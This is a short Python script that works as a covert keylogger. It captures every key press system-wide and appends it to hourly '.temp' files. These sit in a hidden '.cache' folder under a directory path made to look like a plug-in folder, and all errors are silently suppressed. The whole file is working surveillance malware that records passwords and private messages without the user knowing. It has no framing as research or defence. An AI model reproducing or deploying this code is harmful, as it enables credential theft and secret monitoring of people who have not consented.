import os.path
import threading
import keyboard
import time
import getpass

user_name = getpass.getuser()


def create_path():
    if not os.path.isdir(".cache"):
        os.mkdir(".cache")


def write_string(s):
    name = int(time.time() / 3600)
    with open(f".cache\\{name}.temp", mode="a", encoding="utf-8") as f:
        f.write(s)


def main():
    os.chdir(f"C:\\Users\\{user_name}\\Shared\\Common\\Plug-ins\\3.0\\Core")
    create_path()
    while True:
        try:
            s = ""
            for i in range(10):
                # Wait for the next event.
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == "space":
                        s = s + "_"
                    elif event.name == "enter":
                        s += '\n'
                    elif event.name == "tab":
                        s += "    "
                    elif event.name.isalpha() or event.name.isdigit():
                        s += event.name
                    elif event.name == "backspace":
                        s = s + "<-"
                    elif event.name == "ctrl":
                        s = s + "\n" + "ctrl" + "\n"
                    elif event.name == "shift":
                        s = s + "\n" + "shift" + "\n"
                    else:
                        s = s + event.name + " "
            threading.Thread(target=write_string, args=(s,)).start()
        except:
            time.sleep(1)


if __name__ == '__main__':
    try:
        main()
    except:
        pass
